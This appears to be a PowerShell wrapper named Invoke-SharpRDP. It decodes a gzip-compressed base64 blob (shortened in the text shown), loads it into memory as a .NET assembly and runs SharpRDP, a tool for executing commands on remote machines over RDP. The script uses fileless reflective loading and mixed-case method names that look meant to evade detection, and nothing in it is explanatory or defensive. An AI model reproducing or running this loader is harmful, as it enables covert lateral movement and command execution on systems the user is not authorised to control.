function Invoke-SharpRDP
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIA...AiBQA=")) # The omitted "H4sIA...AiBQA=" is actually a 380460 character long Base64 string.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    Write-Host "Wait around 15 secconds for the output"
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [SharpRDP.Program]::Main($Command.Split(" "))
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
